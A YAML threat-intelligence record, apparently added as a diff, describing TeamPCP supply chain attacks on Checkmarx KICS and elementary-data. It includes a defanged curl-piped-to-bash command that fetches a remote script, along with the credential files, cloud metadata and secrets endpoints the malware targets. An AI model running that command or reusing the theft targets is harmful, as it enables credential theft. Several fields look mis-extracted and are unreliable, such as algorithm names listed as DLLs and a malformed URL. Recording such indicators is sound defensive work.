@@ -1,0 +1,61 @@
+title: 'Analyzing TeamPCPs Supply Chain Attacks: Checkmarx KICS and elementary-data
+  in CI/CD Credential Theft'
+description: The threat involves supply chain attacks through compromised Docker Hub
+  images, VS Code extensions, PyPI packages, and GitHub Actions, leading to credential
+  theft and exfiltration.
+attribution: ''
+malware_families:
+- KICS
+- elementary-data
+cves: []
+ttps:
+  processes:
+  - mcpAddon.js
+  - powershell.exe
+  command_lines:
+  - curl -sSL hxxps[://]litter[.]catbox[.]moe/iqesmbhukgd2c7hq[.]sh | bash
+  - mcpAddon.js
+  powershell: []
+  scripts: []
+  registry_keys: []
+  image_loads:
+  - aes-256-gcm.dll
+  - rsa-oaep-sha256.dll
+  network_connections:
+  - elementary-data -> litter[.]catbox[.]moe:443
+  - elementary-data -> gh[.]com:443
+  - elementary-data -> ec2[.]imds[.]amazonaws[.]com:80
+  - elementary-data -> secretsmanager[.]us-east-1[.]amazonaws[.]com:443
+  - https[:]//audit[.]com/cloud/ssh
+  - https[:]//bitwarden/clicompromised/vi/telemetry
+  file_activity:
+  - elementary.pth
+  - /var/log/auth.log
+  - ~/.kube/config
+  - /etc/ssh/ssh_host*_key
+  - .pypirc
+  - .cargo/credentials.toml
+  - .vault-token
+  - .netrc
+  - .git-credentials
+  - terraform.tfstate
+  - .gitlab-ci.yml
+  - Jenkinsfile
+  - secretsmanager:GetSecretValue
+  persistence:
+  - elementary-data .pth fires on every Python interpreter startup on the host
+  process_relations:
+  - mcpAddon.js -> powershell.exe
+iocs:
+  hashes: []
+  ip_addresses: []
+  domains:
+  - litter[.]catbox[.]moe
+  urls:
+  - hxxps[://]litter[.]catbox[.]moe/iqesmbhukgd2c7hq[.]sh
+authors:
+- TrendAI Vision OneTM Threat Intelligence Hub
+- Trend Micro
+reference: https://www.trendmicro.com/en_us/research/26/e/analyzing-teampcp-supply-chain-attacks.html
+date_of_publication: May 13, 2026
+file_creation_date: May 14, 2026
